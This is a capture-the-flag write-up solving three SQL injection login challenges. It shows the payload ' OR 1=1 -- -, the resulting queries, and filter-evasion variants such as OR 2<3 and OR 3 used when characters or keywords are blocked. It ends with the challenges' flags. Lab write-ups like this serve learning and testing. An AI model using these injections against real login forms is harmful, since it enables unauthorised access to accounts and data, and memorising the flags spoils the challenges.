All three of these challenges were sql injection challenges and most of them were very simple. 
For the first one their were no filters so the classical payload worled just fine
`` ' OR 1=1 -- -  ``
This works as the querry happening in the back is something like this 

```mysql
SELECT * FROM users WHERE USERNAME = '' OR 1=1 -- -' AND PASSWORD = "" 
```
As you can see the rest of this is commented out so the password check never happens and because the OR statement is true it does gives us the first user.

The second challenge was placed bans on: 1 0 = /
This is alright as we can just change out payload to something else that is true such as 2<3 
 ```mysql
SELECT * FROM users WHERE USERNAME = '' OR 2<3 -- -' AND PASSWORD = "" 
```
The last challenge is a bit harder as it has a blacklist on many parts of the sql syntax. Somehow OR is not on the blacklist so we can still do a simular thing. In order to get around this we can just user a single number like 3 or 4

 ```mysql
SELECT * FROM users WHERE USERNAME = '' OR 3 -- -' AND PASSWORD = "" 
```
This may seem like it should not work but any posivtive integer is usally evaulated as true in many languages such as python
![image](https://user-images.githubusercontent.com/77011982/122485793-c107cf00-cfa5-11eb-8505-cafc20352088.png)


Flags 
```
bcactf{s0_y0u_f04nd_th3_fl13r?}
bcactf{h0w_d1d_y0u_g3t_h3r3_th1s_t1m3?!?}
bcactf{gu3ss_th3r3s_n0_st0pp1ng_y0u!}
```
